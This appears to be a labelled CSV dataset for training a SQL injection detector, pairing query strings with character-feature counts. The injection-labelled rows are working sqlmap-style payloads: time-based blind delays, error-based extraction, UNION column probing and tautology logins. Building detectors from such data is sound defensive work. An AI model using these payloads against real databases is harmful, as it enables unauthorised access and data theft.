Query,single_comments,logical_operators,arithmetic_operators,drop,union,special_chars,equal,delimiter,dot,whitespaces,digits,alphabets,brackets,nulls,hexadecimal,commas,single_quotes,double_quotes,Label
" SELECT * FROM balloon ORDER BY climate, mostly",0,0,0,0,0,0,0,0,47,8,0,20,0,0,0,1,0,0,0
"1' or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,2,0,0,0,1,0,174,39,12,108,4,0,0,6,1,0,1
"INSERT INTO shoe  ( shinning, serious, hearing )  VALUES  ( 'cheese', 'population', 'shirt' )  ",0,0,0,0,0,0,0,0,95,18,0,47,4,0,0,4,6,0,0
barruecopardo,0,0,0,0,0,0,0,0,13,0,0,13,0,0,0,0,0,0,0
"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  ",0,4,0,0,0,0,1,0,120,46,16,36,10,0,0,1,1,0,1
SELECT * FROM continent FETCH FIRST 3 ROWS ONLY,0,0,0,0,0,0,0,0,47,8,1,9,0,0,0,0,0,0,0
SELECT * FROM art ORDER BY perfectly,0,0,0,0,0,0,0,0,36,6,0,12,0,0,0,0,0,0,0
8.42194E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
select * from users where id  =  1 +$+. or 1  =  1 -- 1,1,1,4,0,0,0,2,0,55,18,4,24,0,0,0,0,0,0,1
"  SELECT skill,bar,goes FROM seen LEFT JOIN Orders ON balloon.builtID =  shade.married ORDER BY scientist.half",0,0,0,0,0,0,1,0,110,16,0,58,0,0,0,2,0,0,0
13791863m,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
"1  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",0,1,0,0,0,0,1,0,256,95,35,96,19,0,2,5,0,0,1
"  UPDATE give SET alive =  'post', City =  'hunt' WHERE became =  lose",0,0,0,0,0,0,3,0,70,17,0,30,0,0,0,1,4,0,0
"  SELECT waste AS her, like AS [popular]  FROM shore",0,0,0,0,0,0,0,0,52,11,0,24,2,0,0,1,0,0,0
"1'||  (  select 'bvic' from dual where 4839  =  4839 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   ||'",0,6,0,0,0,0,2,0,180,65,24,59,12,0,0,1,4,0,1
SELECT TOP 50 PERCENT * FROM anything,0,0,0,0,0,0,0,0,37,6,2,8,0,0,0,0,0,0,0
SELECT * FROM prove WHERE handsome = 'addition'  OR noted = 'upon',0,0,0,0,0,0,2,0,66,12,0,30,0,0,0,0,4,0,0
"1""   )    )    as tfjh where 1134  =  1134 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,2,0,0,0,2,0,133,53,21,43,8,0,0,1,0,1,1
SELECT * FROM gold WHERE greatly = 'consonant' LIMIT 3,0,0,0,0,0,0,1,0,54,9,1,20,0,0,0,0,2,0,0
-9072  )   as saot where 2278  =  2278 order by 1#,0,0,1,0,0,0,1,0,50,15,13,18,1,0,0,0,0,0,1
"1'   )    )    as popm where 6594  =  6594 union all select null,null#",0,0,0,0,1,0,1,0,70,22,9,33,2,2,0,1,1,0,1
SELECT MIN ( wooden )  AS sight FROM valuable,0,0,0,0,0,0,0,0,45,9,0,19,2,0,0,0,0,0,0
"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'efpc' like 'efpc",0,4,0,0,0,0,1,0,303,107,34,122,22,1,0,3,4,0,1
87811832v,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
SELECT * FROM wp_posts WHERE ID  =  28705 LIMIT 1,0,0,0,0,0,0,1,0,49,11,6,7,0,0,0,0,0,0,0
" select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",1,0,2,0,1,1,1,0,77,23,3,40,2,0,0,1,0,0,1
"pasaje lucero 147,",0,0,0,0,0,0,0,0,18,2,3,12,0,0,0,1,0,0,0
SELECT TOP 3 * FROM disappear,0,0,0,0,0,0,0,0,29,5,1,9,0,0,0,0,0,0,0
"-3781  )   union all select 3916,3916,3916--",1,0,3,0,1,0,0,0,44,8,16,14,1,0,0,2,0,0,1
"1""   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--",1,0,2,0,1,0,1,0,81,22,9,41,2,4,0,3,0,1,1
SELECT TOP 3 * FROM within SELECT * FROM soil 3SELECT * FROM white,0,0,0,0,0,0,0,0,66,13,2,15,0,0,0,0,0,0,0
-1257'  )   order by 1#,0,0,1,0,0,0,0,0,23,7,5,7,1,0,0,0,1,0,1
"1""  )   as ucex where 5148  =  5148 order by 1#",0,0,0,0,0,0,1,0,47,15,10,18,1,0,0,0,0,1,1
SELECT * FROM  ( SELECT swing FROM paper ) ,0,0,0,0,0,0,0,0,43,10,0,10,2,0,0,0,0,0,0
"1""  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,4,2,0,0,0,1,0,127,50,16,36,11,0,0,1,0,1,1
"SELECT * FROM few WHERE carry BETWEEN ""circle"" AND    ""him""",0,0,0,0,0,0,0,0,59,12,0,17,0,0,0,0,0,4,0
37609,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,0,0,0
select   (  case when   (  6435  =  8988  )   then 6435 else 6435*  (  select 6435 from information_schema.character_sets  )   end  )  #,0,0,0,0,0,0,1,0,136,39,20,65,6,0,0,0,0,0,1
SELECT AVG ( thick )  FROM hall  SELECT SUM ( shaking ) ,0,0,0,0,0,0,0,0,56,14,0,16,4,0,0,0,0,0,0
calle codigo correspondencia oficial correos-telegrafos 33,0,0,1,0,0,0,0,0,58,5,2,50,0,0,0,0,0,0,0
"1%' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and '%'  =  '",0,2,0,0,0,2,2,0,105,41,13,34,6,0,0,1,4,0,1
1'  )   where 6842  =  6842,0,0,0,0,0,0,1,0,27,10,9,5,1,0,0,0,1,0,1
mortensen@look2fly.nr,0,0,0,0,0,1,0,0,21,0,1,18,0,0,0,0,0,0,0
"1'  )   and elt  (  3528  =  3566,3566  )  ",0,1,0,0,0,0,1,0,43,18,13,6,3,0,0,1,1,0,1
SELECT * FROM remember 3,0,0,0,0,0,0,0,0,24,4,1,8,0,0,0,0,0,0,0
SELECT AVG ( object )  FROM shot  SELECT SUM ( minerals ) ,0,0,0,0,0,0,0,0,58,14,0,18,4,0,0,0,0,0,0
"-6815  )   where 2498  =  2498 union all select 2498,2498,2498,2498,2498--",1,0,3,0,1,0,1,0,74,14,32,19,1,0,0,4,0,0,1
"1""  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""wfwg"" like ""wfwg",0,2,0,0,0,0,1,0,203,85,32,59,16,0,3,4,0,4,1
"SELECT * FROM thrown WHERE wore BETWEEN ""selection"" AND    ""took""",0,0,0,0,0,0,0,0,65,12,0,23,0,0,0,0,0,4,0
"paso de la soledad, 130 10?f",0,0,0,0,0,1,0,0,28,5,5,16,0,0,0,1,0,0,0
bonfiglio cabanas,0,0,0,0,0,0,0,0,17,1,0,16,0,0,0,0,0,0,0
"admin"" or ""1""  =  ""1",0,1,0,0,0,0,1,0,20,6,2,7,0,0,0,0,0,4,1
"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'yvzf'  =  'yvzf",0,2,0,0,3,0,2,0,312,113,55,109,20,0,2,6,4,0,1
SELECT * FROM final  WHERE salmon NOT LIKE '[ship]%',0,0,0,0,0,1,0,0,52,9,0,15,2,0,0,0,2,0,0
yasna,0,0,0,0,0,0,0,0,5,0,0,5,0,0,0,0,0,0,0
clav6ria,0,0,0,0,0,0,0,0,8,0,1,7,0,0,0,0,0,0,0
SELECT column_name ( s )  FROM table2; SELECT City FROM Customers,0,0,0,0,0,0,0,1,65,11,1,27,2,0,0,0,0,0,0
eflujo,0,0,0,0,0,0,0,0,6,0,0,6,0,0,0,0,0,0,0
13061311w,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
1%' waitfor delay '0:0:5' and '%'  =  ',0,1,0,0,0,2,1,0,39,9,4,15,0,0,0,0,6,0,1
SELECT AVG ( seven ) FROM type,0,0,0,0,0,0,0,0,30,6,0,9,2,0,0,0,0,0,0
peda2te1ca,0,0,0,0,0,0,0,0,10,0,2,8,0,0,0,0,0,0,0
1'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'njge' like 'njge,0,2,10,0,0,0,1,0,385,190,47,93,40,0,0,0,4,0,1
"calle arenys de mar, 113,",0,0,0,0,0,0,0,0,25,4,3,16,0,0,0,2,0,0,0
"1"" where 5039  =  5039 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,6,2,0,0,0,2,0,255,100,35,77,22,2,0,4,0,1,1
1'   )    )     )   rlike sleep  (  5  )  #,0,0,0,0,0,0,0,0,43,24,2,10,5,0,0,0,1,0,1
"1%'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,2,0,0,1,1,0,138,41,8,72,6,0,0,2,1,0,1
"calle prat de la riba, 73",0,0,0,0,0,0,0,0,25,5,2,17,0,0,0,1,0,0,0
"-7544""   )    )    union all select 3808,3808,3808,3808--",1,0,3,0,1,0,0,0,57,14,20,14,2,0,0,3,0,1,1
SELECT halfway ( s ) FROM spread INNER JOIN,0,0,0,0,0,0,0,0,43,8,0,14,2,0,0,0,0,0,0
"1'  )   where 2443  =  2443 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1,4,2,0,0,0,2,0,205,80,35,58,17,1,0,3,1,0,1
SELECT Count ( * )  AS just,0,0,0,0,0,0,0,0,27,7,0,8,2,0,0,0,0,0,0
"   SELECT this, union, throat FROM hope WHERE replied  IS NULL",0,0,0,0,0,0,0,0,62,13,0,26,0,0,0,2,0,0,0
select * from users where id  =  '1' *$ . or 1  =  1 -- 1',1,1,2,0,0,0,2,0,58,19,4,24,0,0,0,0,3,0,1
"1'  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,4,2,0,0,0,1,0,183,74,25,53,17,1,0,3,1,0,1
"INSERT INTO tall ( oxygen, coach, term, discussion, lake, fall )  VALUES  ( 'married', 'comfortable'. surprise', 'summer', 'tune', 'suppose', 'skill' )  ",0,0,0,0,0,0,0,0,153,24,0,85,4,0,0,10,13,0,0
